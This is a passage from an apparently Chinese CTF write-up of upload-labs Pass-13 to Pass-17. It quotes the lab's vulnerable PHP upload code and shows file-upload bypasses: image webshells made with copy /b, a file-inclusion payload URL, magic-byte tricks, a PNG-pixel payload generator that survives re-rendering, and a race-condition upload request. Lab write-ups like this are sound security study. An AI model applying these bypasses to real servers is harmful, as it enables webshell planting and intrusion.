class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到将GET改成了POST，POST%00不会被自动解析,所以我们抓取信息后在hex二进制后添加</p><p><img src="/12.jpg"></p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码通过读取文件前两个字节来判断文件类型，因此上传图片马，利用文件包含漏洞，读取图片马，当作php文件解析。</p><p>1.php：<br><br><code>&lt;?php phpinfo(); ?&gt;</code></p><p>cmd:<br><br><code>copy 1.jpg/b+2.php/a webshell.jpg</code></p><p>文件包含漏洞</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line">/*</span><br><span class="line">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span><br><span class="line"><span class="php">*/</span></span><br><span class="line"><span class="php">header(<span class="string">"Content-Type:text/html;charset=utf-8"</span>);</span></span><br><span class="line"><span class="php">$file = $_GET[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">include</span> $file;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__file__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>利用file读取木马，include将图片马中的php代码解析!</p><p>payload:<br><br><code>http://2e0b8a71-0ad3-4a16-b653-1cf83aaeaf31.node3.buuoj.cn/include.php?file=upload/4120200115072754.jpg</code></p><p><img src="/13.jpg"></p><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过getimagesize(),来判断图片。但是其中也有判断是否为jpg，或者gif和png。利用pass-13的图片马可以实现绕过！</p><p><img src="/14.jpg"></p><h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h3><p><em><strong>如果只有一个getimagesize()限制那么可以用普通文件，通过设置height以及width来绕过。</strong></em></p><p>如：<br></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> width 1337</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> height 1337</span></span><br></pre></td></tr></table></figure><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过exif_imagetype()来判断是否为图片。</p><ul><li>exif_imagetype() 读取一个图像的第一个字节并检查其签名。</li></ul><p>可以通过图片马绕过。</p><h3 id="exif-imagetype"><a href="#exif-imagetype" class="headerlink" title="exif_imagetype()"></a>exif_imagetype()</h3><p><em><strong>exif_imagetype() 读取一个图像的第一个字节并检查其签名。</strong></em></p><p>exif_imagetype() 的绕过方式</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以用"<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>8a<span class="symbol">\x</span>39<span class="symbol">\x</span>8a<span class="symbol">\x</span>39"</span><br><span class="line">也可以用"#define width 1337"</span><br><span class="line">        "#define height 1337"</span><br></pre></td></tr></table></figure><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = null;</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    /<span class="regexp">/ 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line"><span class="regexp">    $filename = $_FILES['upload_file']['name'];</span></span><br><span class="line"><span class="regexp">    $filetype = $_FILES['upload_file']['type'];</span></span><br><span class="line"><span class="regexp">    $tmpname = $_FILES['upload_file']['tmp_name'];</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    $target_path=UPLOAD_PATH.'/</span><span class="string">'.basename($filename);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 获得上传文件的扩展名</span></span><br><span class="line"><span class="string">    $fileext= substr(strrchr($filename,"."),1);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    //判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line"><span class="string">    if(($fileext == "jpg") &amp;&amp; ($filetype=="image/jpeg"))&#123;</span></span><br><span class="line"><span class="string">        if(move_uploaded_file($tmpname,$target_path))&#123;</span></span><br><span class="line"><span class="string">            //使用上传的图片生成新的图片</span></span><br><span class="line"><span class="string">            $im = imagecreatefromjpeg($target_path);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            if($im == false)&#123;</span></span><br><span class="line"><span class="string">                $msg = "该文件不是jpg格式的图片！";</span></span><br><span class="line"><span class="string">                @unlink($target_path);</span></span><br><span class="line"><span class="string">            &#125;else&#123;</span></span><br><span class="line"><span class="string">                //给新图片指定文件名</span></span><br><span class="line"><span class="string">                srand(time());</span></span><br><span class="line"><span class="string">                $newfilename = strval(rand()).".jpg";</span></span><br><span class="line"><span class="string">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line"><span class="string">                $img_path = UPLOAD_PATH.'</span>/<span class="string">'.$newfilename;</span></span><br><span class="line"><span class="string">                imagejpeg($im,$img_path);</span></span><br><span class="line"><span class="string">                @unlink($target_path);</span></span><br><span class="line"><span class="string">                $is_upload = true;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            $msg = "上传出错！";</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#125;else if(($fileext == "png") &amp;&amp; ($filetype=="image/png"))&#123;</span></span><br><span class="line"><span class="string">        if(move_uploaded_file($tmpname,$target_path))&#123;</span></span><br><span class="line"><span class="string">            //使用上传的图片生成新的图片</span></span><br><span class="line"><span class="string">            $im = imagecreatefrompng($target_path);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            if($im == false)&#123;</span></span><br><span class="line"><span class="string">                $msg = "该文件不是png格式的图片！";</span></span><br><span class="line"><span class="string">                @unlink($target_path);</span></span><br><span class="line"><span class="string">            &#125;else&#123;</span></span><br><span class="line"><span class="string">                 //给新图片指定文件名</span></span><br><span class="line"><span class="string">                srand(time());</span></span><br><span class="line"><span class="string">                $newfilename = strval(rand()).".png";</span></span><br><span class="line"><span class="string">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line"><span class="string">                $img_path = UPLOAD_PATH.'</span>/<span class="string">'.$newfilename;</span></span><br><span class="line"><span class="string">                imagepng($im,$img_path);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                @unlink($target_path);</span></span><br><span class="line"><span class="string">                $is_upload = true;               </span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            $msg = "上传出错！";</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#125;else if(($fileext == "gif") &amp;&amp; ($filetype=="image/gif"))&#123;</span></span><br><span class="line"><span class="string">        if(move_uploaded_file($tmpname,$target_path))&#123;</span></span><br><span class="line"><span class="string">            //使用上传的图片生成新的图片</span></span><br><span class="line"><span class="string">            $im = imagecreatefromgif($target_path);</span></span><br><span class="line"><span class="string">            if($im == false)&#123;</span></span><br><span class="line"><span class="string">                $msg = "该文件不是gif格式的图片！";</span></span><br><span class="line"><span class="string">                @unlink($target_path);</span></span><br><span class="line"><span class="string">            &#125;else&#123;</span></span><br><span class="line"><span class="string">                //给新图片指定文件名</span></span><br><span class="line"><span class="string">                srand(time());</span></span><br><span class="line"><span class="string">                $newfilename = strval(rand()).".gif";</span></span><br><span class="line"><span class="string">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line"><span class="string">                $img_path = UPLOAD_PATH.'</span>/<span class="string">'.$newfilename;</span></span><br><span class="line"><span class="string">                imagegif($im,$img_path);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                @unlink($target_path);</span></span><br><span class="line"><span class="string">                $is_upload = true;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            $msg = "上传出错！";</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;else&#123;</span></span><br><span class="line"><span class="string">        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><pre><code>二次渲染后会将我们的一句话木马删除</code></pre><p>因为环境的问题，我的木马没被删除。。。，我不知道哪里出问题了具体可以看</p><p><a href="https://xz.aliyun.com/t/2657#toc-10" target="_blank" rel="noopener">upload-labs之pass 16详细分析</a></p><ul><li>PNG图片</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p = <span class="built_in">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">    <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">    <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">     $r = $p[$y];</span><br><span class="line">     $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">     $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">     $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">     imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">'./1.png'</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>GIF</li></ul><p>GIF图片对比原先和二次渲染的部分，将没有被改变的地方中间插入PHP语句就行。</p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;       <span class="comment">//临时储存</span></span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;           <span class="comment">//判断</span></span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);       <span class="comment">//如果不为jpg||png||gif,删除</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为他是先储存再删除，可以来进行竞争上传，一个上传php文件，一个请求该php文件。</p><h3 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h3><p>网站逻辑：<br>1、网站允许上传任意文件，然后检查上传文件是否包含webshell,如果包含删除该文件。<br>2、网站允许上传任意文件，但是如果不是指定类型，那么使用unlink删除文件。<br>在删除之前访问上传的php文件，从而执行上传文件中的php代码。<br>从而达到利用的效果。</p><h3 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h3><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST <span class="regexp">/Pass-17/</span>index.php?action=show_code HTTP/1.1</span><br><span class="line">Host: <span class="number">03</span>c52d9c-b9b4<span class="number">-46</span>c5-ac2a-aa25cb0dee7a.node3.buuoj.cn</span><br><span class="line">Content-<span class="string">Length:</span> <span class="number">318</span></span><br><span class="line"><span class="string">Pragma:</span> no-cache</span><br><span class="line">Cache-<span class="string">Control:</span> no-cache</span><br><span class="line">Upgrade-Insecure-<span class="string">Requests:</span> <span class="number">1</span></span><br><span class="line">User-<span class="string">Agent:</span> Mozilla<span class="regexp">/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/</span><span class="number">537.36</span> (KHTML, like Gecko) Chrome<span class="regexp">/79.0.3945.79 Safari/</span><span class="number">537.36</span></span><br><span class="line"><span class="string">Origin:</span> <span class="string">http:</span><span class="comment">//03c52d9c-b9b4-46c5-ac2a-aa25cb0dee7a.node3.buuoj.cn</span></span><br><span class="line">Content-<span class="string">Type:</span> multipart/form-data; boundary=----WebKitFormBoundaryPBfkOqXEbfZTLCFK</span><br><span class="line"><span class="string">Accept:</span> text<span class="regexp">/html,application/</span>xhtml+xml,application<span class="regexp">/xml;q=0.9,image/</span>webp,image<span class="regexp">/apng,*/</span>*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.9</span></span><br><span class="line"><span class="string">Referer:</span> <span class="string">http:</span><span 